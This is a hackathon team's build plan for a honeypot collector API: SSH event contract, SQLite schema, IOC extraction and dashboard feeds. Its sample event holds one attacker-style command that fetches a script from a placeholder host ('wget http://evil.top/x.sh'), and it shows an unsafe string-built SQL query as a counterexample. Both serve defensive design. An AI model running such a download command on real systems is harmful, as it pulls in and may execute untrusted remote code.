# Backend plan — collector API

Your piece: receive JSON from the honeypot, store it in SQLite, serve it to the
frontend. Do the steps in order. Each one ends with something you can verify.

**Repo state right now:** `base_server.py` (paramiko honeypot, Person 1),
`frontend/` (Vite + React + Tailwind + shadcn, Person 4), `keys/`, `gen-keys.sh`.
Your work goes in a new `backend/` directory. Repo is **public**.

---

## Step 0 — Untrack the SSH keys (5 min)

`keys/` is committed and pushed to a public repo. These are disposable honeypot
test keys that `gen-keys.sh` regenerates, so nothing valuable leaked — but a
public repo with private keys in it looks bad at a security hackathon, and it's
the exact habit that leaks a real key later.

```bash
cd ~/Desktop/UBHacking2026_Honeypot_Mesh
git rm --cached keys/*
```

Then do Step 1, commit both together, and tell your team to run `./gen-keys.sh`
after pulling. (Don't bother rewriting git history — these keys protect
nothing.)

---

## Step 1 — Root `.gitignore`

Replace your current one (`./.venv` and `./venv` don't work — gitignore ignores
a leading `./`) with this:

```gitignore
# SSH host keys — regenerate with ./gen-keys.sh
keys/

# Secrets
.env
.env.*
!.env.example
*.key
*.pem

# Capture data — real attacker IPs and live payload URLs
*.db
*.db-wal
*.db-shm
data/
*.log

# Python
__pycache__/
*.py[cod]
.venv/
/venv/
.pytest_cache/

# Node (frontend/ has its own too)
node_modules/
dist/

# ML
*.pkl
*.joblib
models/

# Editors / OS
.vscode/
.idea/
.DS_Store
*~
```

```bash
git add .gitignore && git rm --cached keys/*
git commit -m "Untrack generated SSH keys; add root gitignore"
git push
```

Also delete the stray 0-byte `Agent` file in the repo root.

---

## Step 2 — Create the backend and install

```bash
cd ~/Desktop/UBHacking2026_Honeypot_Mesh
mkdir -p backend/app backend/scripts backend/tests
cd backend

python3 -m venv .venv
source .venv/bin/activate

pip install fastapi "uvicorn[standard]" pydantic httpx python-dotenv pytest
pip freeze > requirements.txt
```

Nothing to install for the database — SQLite ships with Python.

Create `backend/.env.example` (commit this) and copy it to `.env` (ignored):

```bash
HONEYPOT_DB=./data/honeypot.db
COLLECTOR_TOKEN=changeme
ML_URL=http://127.0.0.1:8100/classify
SESSION_IDLE_TIMEOUT=300
```

```bash
cp .env.example .env
python -c "import secrets; print(secrets.token_urlsafe(24))"   # paste into .env
```

---

## Step 3 — Agree the event contract (do this before coding)

Post this in the group chat. Person 1 sends it, Person 4 displays it, so a
rename tomorrow means editing two other people's code.

```json
{
  "session_id": "uuid4 string",
  "honeypot":   "hp1",
  "src_ip":     "192.168.1.44",
  "type":       "login | command | logout",

  "ts":         "2026-11-07T18:22:01Z",
  "src_port":   54321,

  "username":   "root",
  "password":   "123456",

  "command":    "wget http://evil.top/x.sh",
  "response":   "Saving to: 'x.sh'...",
  "handled_by": "local | llm"
}
```

First four fields required; the rest depend on `type`. Three rules to state out
loud:

1. Person 1 generates `session_id` (uuid4) and keeps it the same for the whole
   connection.
2. A `command` may arrive with **no `login` first** — your ingest must create
   the session row, not error.
3. `command` is capped at 4000 chars. Attackers paste huge base64 blobs.

**Concretely, for Person 1:** in `base_server.py`, line 99 is
`print(f"COMMAND: {command}")`. That's the hook — it becomes a POST to your
`/events`. One small function, called in three places (after auth, after each
command, on exit).

Also settle with Person 3 now: do you POST to their HTTP endpoint, or import a
Python function? Either is fine, but pick today.

---

## Step 4 — First code, and unblock the frontend (first hour)

`backend/app/__init__.py` — empty file.

`backend/app/main.py`:

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI(title="Honeypot Mesh Collector")

# Vite dev server runs on 5173 — without this the browser blocks every request
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/health")
def health():
    return {"ok": True}
```

```bash
uvicorn app.main:app --reload --port 8000
```

Open <http://127.0.0.1:8000/docs> — FastAPI generates that from your code.
You'll use it instead of curl all weekend.

**Then add `GET /sessions` returning a hard-coded list of 2–3 dicts shaped like
the contract, and send Person 4 the `/docs` link.** They're unblocked before
you've written any SQL. Do this first; everything below can wait.

---

## Step 5 — Database and real ingest

### Files

| File | Holds |
|---|---|
| `app/main.py` | routes only — keep it thin |
| `app/models.py` | Pydantic models = the contract in code |
| `app/schema.sql` | tables |
| `app/db.py` | connection + helpers |
| `app/store.py` | all SQL |
| `app/ioc.py` | regex extraction, pure functions |

SQL stays out of `main.py` so you can test it without an HTTP client.

### `schema.sql` — four tables

- **sessions** — `id` TEXT PK (the honeypot's uuid), `honeypot`, `src_ip`,
  `src_port`, `username`, `password`, `started_at`, `last_seen_at`, `ended_at`,
  `status`, `command_count`, `cluster_id`, `confidence`, `is_novel`
- **events** — `id` INTEGER PK AUTOINCREMENT, `session_id`, `ts`, `type`,
  `command`, `response`, `handled_by`
- **iocs** — `id`, `session_id`, `type`, `value`, `first_seen`,
  `UNIQUE(session_id, type, value)`
- **clusters** — `id`, `name`, `description`, `severity`, `size`

Use `CREATE TABLE IF NOT EXISTS` and run the file on every startup — then you
never need migrations.

Two choices that pay off later:

- `events.id` autoincrements, so it doubles as a **cursor**: the frontend asks
  "everything after id 400" with no timestamp math. That's your live feed.
- Store timestamps as ISO-8601 UTC strings. They sort lexically in
  chronological order, so `WHERE last_seen_at < ?` works with no date parsing.

### `db.py`

```python
import sqlite3

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
conn.row_factory = sqlite3.Row            # row["src_ip"] instead of row[2]
conn.execute("PRAGMA journal_mode=WAL")   # frontend can read while honeypot writes
```

One shared connection, a `threading.Lock` around writes. Simpler than a pool,
and your volume is a few events per second.

**Never break this one:**

```python
cur.execute("SELECT * FROM sessions WHERE id = ?", (sid,))     # yes
cur.execute(f"SELECT * FROM sessions WHERE id = '{sid}'")      # never
```

Command text is attacker-written. SQL injection in your own collector at a
security hackathon is the worst bug you could ship.

### `POST /events`

Validate with Pydantic → call `store.ingest_event()`, which:

1. Upserts the session (`INSERT ... ON CONFLICT(id) DO NOTHING`) — handles a
   command with no login
2. Inserts the event
3. Bumps `last_seen_at`, and `command_count` if it's a command
4. On `logout`, sets `status='closed'` and `ended_at`

Require a header `X-Collector-Token` matching `COLLECTOR_TOKEN`, and bind the
API to `127.0.0.1`. The collector is not the thing you expose at the demo.

Verify: POST an event with `/docs`, then `GET /sessions/{id}` and see it back.

---

## Step 6 — IOC extraction

`app/ioc.py`, one function: `extract(text) -> [(type, value)]`. Regexes for
URLs, IPv4, domains, hashes, long base64 blobs, `/tmp` paths. Call it from
ingest, insert what it returns. No database code in this file — that's what
makes it trivially unit-testable.

Two bugs you'd otherwise hit:

- Match URLs **first**, strip them from the text, *then* look for bare IPs and
  domains — otherwise one payload host gets reported three times.
- Filenames look like domains. `wget -O x.sh` reports `x.sh` as a domain if
  `.sh` is in your TLD list. Keep `sh`, `cc`, `in`, `co`, `me` off the
  bare-hostname list, but still accept any host that came from a real URL — the
  `http://` already proved it's a host.

---

## Step 7 — Live updates

`GET /live?since=<event_id>` → events with a higher id, plus the new cursor.
Frontend polls it every 1–2 seconds. Ship this. Add a WebSocket only if
everything else is done.

**Session timeout:** a background task every 30s closing any `open` session
whose `last_seen_at` is older than 5 minutes — because honeypots crash without
sending `logout`.

---

## Step 8 — Last two

- **ML hand-off** — on session close, POST its commands to Person 3, store the
  result. Wrap in try/except and swallow failures: if their service is down,
  sessions show unclassified instead of breaking ingest.
- **`scripts/fake_honeypot.py`** — POSTs realistic sessions so you can test and
  demo without the real honeypot. Write it earlier if Person 1 falls behind; it
  also generates the training traffic Person 3 needs.

---

## Commit / don't commit

| Commit | Never |
|---|---|
| `backend/requirements.txt` | `.venv/` |
| `backend/.env.example` | `.env` |
| `backend/app/*.py`, `schema.sql` | `data/*.db` |
| `backend/README.md` (the contract) | `keys/` |
| `PLAN.md` | `__pycache__/` |

A clone should need only: venv → `pip install -r requirements.txt` →
`cp .env.example .env` → `uvicorn app.main:app --reload`.

Run `git status` before every commit. If `.env` or a `.db` appears, fix
`.gitignore` before committing — pulling a secret out of git history is far
worse than preventing it.

---

## Flag to your teammates

Not your code, but it'll bite the demo:

1. **`base_server.py:31` only accepts `user`/`password`.** A honeypot should
   accept *any* credentials — then log what was tried. Right now an attacker
   gets rejected and leaves.
2. **It handles one connection at a time.** `listen()` calls `sock.accept()`
   once and returns, so the outer `while True` restarts the whole listener per
   connection. Needs a thread per connection before two people can connect at
   once.
3. **No `requirements.txt` for paramiko** — nobody can run `base_server.py`
   from a fresh clone.

---

## Done looks like (end of day one)

- [ ] `keys/` untracked, `.gitignore` committed
- [ ] Event contract agreed by Person 1 in the chat
- [ ] `/docs` link sent to Person 4
- [ ] `POST /events` writes to SQLite; `GET /sessions/{id}` replays it
- [ ] IOCs appear for a `wget http://...` command
- [ ] Seed script fills the dashboard on demand
